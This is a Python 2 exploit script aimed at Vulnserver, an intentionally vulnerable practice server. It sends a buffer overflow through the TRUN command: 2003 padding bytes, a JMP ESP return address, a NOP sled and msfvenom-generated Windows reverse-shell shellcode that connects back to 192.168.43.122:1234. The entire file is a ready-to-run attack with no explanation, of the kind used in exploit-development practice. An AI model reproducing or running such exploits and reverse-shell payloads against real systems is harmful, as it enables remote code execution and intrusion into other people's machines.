#!/usr/bin/python

#vuln server = https://github.com/stephenradshaw/vulnserver

import sys , socket

buff = "TRUN /.:/"

buff += "A" * 2003

buff += "\xAF\x11\x50\x62"    #JMP ESP

buff += "\x90" * 10      #NOP

#msfvenom -p windows/shell_reverse_tcp lhost=192.168.43.122  lport=1234 -a x86 -f python -b "\x00"

buff += b""
buff += b"\xba\xbe\x55\x85\x95\xda\xd0\xd9\x74\x24\xf4\x5d\x2b"
buff += b"\xc9\xb1\x52\x31\x55\x12\x83\xc5\x04\x03\xeb\x5b\x67"
buff += b"\x60\xef\x8c\xe5\x8b\x0f\x4d\x8a\x02\xea\x7c\x8a\x71"
buff += b"\x7f\x2e\x3a\xf1\x2d\xc3\xb1\x57\xc5\x50\xb7\x7f\xea"
buff += b"\xd1\x72\xa6\xc5\xe2\x2f\x9a\x44\x61\x32\xcf\xa6\x58"
buff += b"\xfd\x02\xa7\x9d\xe0\xef\xf5\x76\x6e\x5d\xe9\xf3\x3a"
buff += b"\x5e\x82\x48\xaa\xe6\x77\x18\xcd\xc7\x26\x12\x94\xc7"
buff += b"\xc9\xf7\xac\x41\xd1\x14\x88\x18\x6a\xee\x66\x9b\xba"
buff += b"\x3e\x86\x30\x83\x8e\x75\x48\xc4\x29\x66\x3f\x3c\x4a"
buff += b"\x1b\x38\xfb\x30\xc7\xcd\x1f\x92\x8c\x76\xfb\x22\x40"
buff += b"\xe0\x88\x29\x2d\x66\xd6\x2d\xb0\xab\x6d\x49\x39\x4a"
buff += b"\xa1\xdb\x79\x69\x65\x87\xda\x10\x3c\x6d\x8c\x2d\x5e"
buff += b"\xce\x71\x88\x15\xe3\x66\xa1\x74\x6c\x4a\x88\x86\x6c"
buff += b"\xc4\x9b\xf5\x5e\x4b\x30\x91\xd2\x04\x9e\x66\x14\x3f"
buff += b"\x66\xf8\xeb\xc0\x97\xd1\x2f\x94\xc7\x49\x99\x95\x83"
buff += b"\x89\x26\x40\x03\xd9\x88\x3b\xe4\x89\x68\xec\x8c\xc3"
buff += b"\x66\xd3\xad\xec\xac\x7c\x47\x17\x27\x43\x30\x3c\xcd"
buff += b"\x2b\x43\x42\x35\x7e\xca\xa4\x5f\x6e\x9b\x7f\xc8\x17"
buff += b"\x86\x0b\x69\xd7\x1c\x76\xa9\x53\x93\x87\x64\x94\xde"
buff += b"\x9b\x11\x54\x95\xc1\xb4\x6b\x03\x6d\x5a\xf9\xc8\x6d"
buff += b"\x15\xe2\x46\x3a\x72\xd4\x9e\xae\x6e\x4f\x09\xcc\x72"
buff += b"\x09\x72\x54\xa9\xea\x7d\x55\x3c\x56\x5a\x45\xf8\x57"
buff += b"\xe6\x31\x54\x0e\xb0\xef\x12\xf8\x72\x59\xcd\x57\xdd"
buff += b"\x0d\x88\x9b\xde\x4b\x95\xf1\xa8\xb3\x24\xac\xec\xcc"
buff += b"\x89\x38\xf9\xb5\xf7\xd8\x06\x6c\xbc\xe9\x4c\x2c\x95"
buff += b"\x61\x09\xa5\xa7\xef\xaa\x10\xeb\x09\x29\x90\x94\xed"
buff += b"\x31\xd1\x91\xaa\xf5\x0a\xe8\xa3\x93\x2c\x5f\xc3\xb1"


s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('Target ip',9000))
print s.recv(1024)
s.send(buff)
s.close()